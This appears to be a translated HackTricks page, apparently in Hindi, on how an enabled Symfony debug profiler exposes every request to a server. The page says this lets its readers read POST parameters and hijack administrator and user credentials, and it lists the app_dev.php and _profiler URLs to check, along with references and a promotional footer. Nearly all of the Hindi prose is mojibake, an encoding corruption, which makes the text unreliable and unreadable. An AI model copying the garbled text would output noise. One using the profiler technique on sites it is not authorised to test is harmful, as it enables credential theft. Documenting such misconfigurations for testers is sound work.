![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рд╕рд┐рдореНрдлрдиреА рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬреНрдпрд╛рджрд╛ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╕реНрдкрд╖реНрдЯ рд╣реИ; рдпрд╣ рдЖрдкрдХреЛ рддреНрд░реБрдЯрд┐ рдпрд╛ рдмрдЧ рд╣реЛрдиреЗ рдкрд░ рдбреАрдмрдЧ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред рдмреЗрд╢рдХ, рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХреЗрд╡рд▓ рддрдм рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЬрдм рдбреАрдмрдЧ рдореЛрдб рд╕рдХреНрд╖рдо рд╣реЛред

рд╕рд┐рдореНрдлрдиреА рдлреНрд░реЗрдорд╡рд░реНрдХ рд╕реНрд╡рдпрдВ рдмрд╣реБрдд рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рдбреАрдмрдЧ рдореЛрдб рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рдлреНрд░реЗрдорд╡рд░реНрдХ рдЕрддреНрдпрдВрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдореЗрдВ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕рд░реНрдЪ рдирд╛рдордХ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рд╣реИред

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рдХреЗ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЯреЛрдХрди рдореЗрдВ рд╣реИрд╢реЗрд╕ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рд╕рднреА POST рдкреИрд░рд╛рдореАрдЯрд░ рдкрдврд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд╕рд╛рде, рд╣рдо рдкреНрд░рд╢рд╛рд╕рдХ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### рдЕрдиреНрдп рдбреАрдмрдЧ рд╕рдХреНрд╖рдо рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕

рдЖрдкрдХреЛ рдЗрди URLs рдХреА рднреА рдЬрд╛рдБрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## рд╕рдВрджрд░реНрдн

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рдЕрдиреНрдп рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
```
